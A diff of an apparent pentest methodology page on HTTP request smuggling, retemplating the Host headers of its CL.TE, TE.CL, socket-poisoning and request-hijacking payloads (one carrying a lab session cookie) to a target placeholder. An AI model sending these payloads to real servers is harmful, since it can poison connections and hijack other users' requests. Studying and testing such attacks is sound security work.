@@ -13,15 +13,15 @@ description: HTTP Request Smuggling atttacks
 
 ## Detection
 
-Please first try detecting **CL.TE** as if it is vulnerable to it, the **TE.CL** detection payload wil poison the socket and cause a lot of harm
+Please **FIRST** try detecting **CL.TE** as if it is vulnerable to it, the **TE.CL** detection payload wil poison the socket and cause a lot of harm
 
-### 1. **CL.TE** detection
+### **CL.TE** detection
 
 Send the following request:
 
 ```http
 POST /about HTTP/1.1
-Host: example.com
+Host: {{ target-domain vulerable.net }}
 Transfer-Encoding: chunked
 Content-Length: 4
 
@@ -39,13 +39,13 @@ There is 4 possible outcomes:
 Only after confirming no **CL.TE** desync attacks can be performed you can check the next variant:
 
 
-### 2. **TE.CL** detection
+### **TE.CL** detection
 
 Send the following request:
 
 ```http
 POST /about HTTP/1.1
-Host: example.com
+Host: {{ target-domain vulerable.net }}
 Transfer-Encoding: chunked
 Content-Length: 6
 
@@ -72,7 +72,7 @@ You can just _poison_ legitimate requests. For example the following request wou
 
 ```http
 POST / HTTP/1.1
-Host: example.com
+Host: {{ target-domain vulerable.net }}
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
@@ -92,7 +92,7 @@ You can Actually change other users requests, so you can force them  to execute 
 
 ```http
 POST / HTTP/1.1
-Host: acc91f8c1e632ea4c0f712d4004400ec.web-security-academy.net
+Host: {{ target-domain vulerable.net }}
 Cookie: session=fnJJc90vRfPmIYHB3xmzTYJyhLx5JhGO
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 3
@@ -100,7 +100,7 @@ Transfer-Encoding: chunked
 
 9d
 GPOST / HTTP/1.1
-Host: acc91f8c1e632ea4c0f712d4004400ec.web-security-academy.net
+Host: {{ target-domain vulerable.net }}
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 123
 
@@ -117,7 +117,7 @@ a=
 
 ```http
 POST / HTTP/1.1
-Host: example.com
+Host: {{ target-domain vulerable.net }}
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
 Transfer-Encoding: cow
